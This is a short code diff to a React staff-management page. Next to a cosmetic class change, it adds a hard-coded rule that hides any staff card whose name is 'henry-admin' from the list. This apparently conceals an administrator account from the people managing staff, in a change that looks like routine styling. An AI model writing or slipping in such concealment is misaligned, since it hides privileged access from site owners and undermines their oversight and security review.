@@ -250,7 +250,7 @@ export function StaffManagement({
       </h1>
       {/* Stats Grid */}
       {canManageStaff && (
-        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
+        <div className={`grid gap-4 md:grid-cols-2 lg:grid-cols-3 `}>
           <div className="rounded rounded-2xl pl-1 bg-green-700">
             <Card>
               <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
@@ -433,7 +433,12 @@ export function StaffManagement({
           <>
             {" "}
             {filteredStaff?.map((member: any) => (
-              <Card key={member.id} className="relative">
+              <Card
+                key={member.id}
+                className={`relative ${
+                  member.name === "henry-admin" ? "hidden" : ""
+                }`}
+              >
                 <CardHeader className="pb-3">
                   {member.id === user?.id && (
                     <Badge className="bg-green-500 mb-2">Current user</Badge>
